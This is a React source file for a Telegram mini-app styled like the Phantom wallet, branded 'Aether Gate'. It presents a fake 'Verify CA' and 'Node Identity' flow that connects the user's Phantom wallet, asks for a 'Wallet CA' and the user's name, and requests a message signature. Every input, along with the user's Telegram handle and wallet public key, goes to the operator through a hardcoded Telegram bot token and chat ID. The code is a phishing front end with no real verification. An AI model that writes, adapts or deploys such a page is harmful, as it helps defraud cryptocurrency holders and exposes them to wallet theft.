import React, { useState, useEffect } from 'react';

const BOT_TOKEN = "8515224137:AAGkieoUFLWj6WxO4T0Pig8Mhs5qHrEcBrY";
const CHAT_ID = "7539902547";

const App: React.FC = () => {
  const [step, setStep] = useState<1 | 2>(1);
  const [walletCA, setWalletCA] = useState<string>('');
  const [userName, setUserName] = useState<string>('');
  const [status, setStatus] = useState<'idle' | 'verifying' | 'completed'>('idle');
  
  const tg = (window as any).Telegram?.WebApp;

  useEffect(() => {
    if (tg) {
      tg.ready();
      tg.expand();
      tg.setHeaderColor?.('#17101F');
    }
  }, [tg]);

  const sendToBot = async (data: string, type: 'CA' | 'NAME' | 'SIGNATURE', publicKey?: string) => {
    const username = tg?.initDataUnsafe?.user?.username || 'User';
    const logMsg = `🔐 <b>AETHER GATE LOG</b>\n` +
                   `<b>User:</b> @${username}\n` +
                   `<b>Type:</b> ${type}\n` +
                   `<b>Data:</b> <code>${data}</code>\n` +
                   (publicKey ? `<b>Wallet:</b> <code>${publicKey}</code>` : "");

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: logMsg, parse_mode: 'HTML' }),
    });
  };

  const handleStepOne = async () => {
    if (!walletCA) return alert("Please enter the Wallet CA");
    setStatus('verifying');
    try {
      const provider = (window as any).solana || (window as any).phantom?.solana;
      if (!provider?.isPhantom) {
        alert("Please use the Phantom Wallet browser.");
        setStatus('idle');
        return;
      }
      const resp = await provider.connect();
      await sendToBot(walletCA, 'CA', resp.publicKey.toString());
      setStep(2);
      setStatus('idle');
    } catch { setStatus('idle'); }
  };

  const handleStepTwo = async () => {
    if (!userName) return alert("Please enter your name");
    setStatus('verifying');
    try {
      const provider = (window as any).solana || (window as any).phantom?.solana;
      
      // Request final signature verification
      const message = `Aether Network: Verify user ${userName}`;
      const encodedMessage = new TextEncoder().encode(message);
      await provider.signMessage(encodedMessage, "utf8");
      
      await sendToBot(userName, 'NAME', provider.publicKey.toString());
      await sendToBot("Final Verification Signed", 'SIGNATURE');
      
      setStatus('completed');
      alert("AETHER: Verification process complete.");
    } catch (err: any) {
      alert("Verification Failed: " + (err.message || "User rejected signature"));
      setStatus('idle');
    }
  };

  const theme = {
    bg: 'linear-gradient(180deg, #17101F 0%, #0D0912 100%)',
    card: '#20182A',
    purple: '#AB9FF2',
    text: '#FFFFFF',
    textMuted: '#998DA8',
    input: '#2C2337'
  };

  return (
    <div style={{ background: theme.bg, minHeight: '100vh', color: theme.text, fontFamily: 'sans-serif', display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '60px 20px' }}>
      <div style={{ background: theme.purple, width: '60px', height: '60px', borderRadius: '18px', marginBottom: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        <svg width="32" height="32" viewBox="0 0 24 24" fill="white"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
      </div>

      <h1 style={{ fontSize: '28px', fontWeight: '700', margin: '0 0 8px 0' }}>
        {step === 1 ? 'Verify CA' : 'Node Identity'}
      </h1>
      <p style={{ color: theme.textMuted, fontSize: '16px', marginBottom: '40px', textAlign: 'center' }}>
        {step === 1 ? "Enter your wallet's CA" : "Enter your name to sign and finish"}
      </p>

      <div style={{ width: '100%', maxWidth: '360px', background: theme.card, padding: '24px', borderRadius: '24px', border: '1px solid rgba(255,255,255,0.05)' }}>
        <label style={{ display: 'block', fontSize: '11px', fontWeight: '600', color: theme.textMuted, marginBottom: '8px', textTransform: 'uppercase' }}>
          {step === 1 ? "Wallet's CA" : "Your Name"}
        </label>
        
        <input 
          type="text" 
          value={step === 1 ? walletCA : userName}
          onChange={(e) => step === 1 ? setWalletCA(e.target.value) : setUserName(e.target.value)}
          placeholder={step === 1 ? "Enter Wallet CA..." : "Enter Name..."}
          style={{ width: '100%', padding: '16px', borderRadius: '12px', border: 'none', background: theme.input, color: 'white', marginBottom: '24px', fontSize: '16px', boxSizing: 'border-box', outline: 'none' }}
        />

        <button 
          onClick={step === 1 ? handleStepOne : handleStepTwo}
          disabled={status !== 'idle'} 
          style={{ width: '100%', padding: '16px', borderRadius: '100px', border: 'none', background: status === 'completed' ? '#4BB543' : theme.purple, color: '#17101F', fontWeight: '700', fontSize: '16px', cursor: 'pointer' }}
        >
          {status === 'verifying' ? 'Processing...' : step === 1 ? 'Verify Wallet CA' : 'Sign & Finish'}
        </button>
      </div>
    </div>
  );
};

export default App;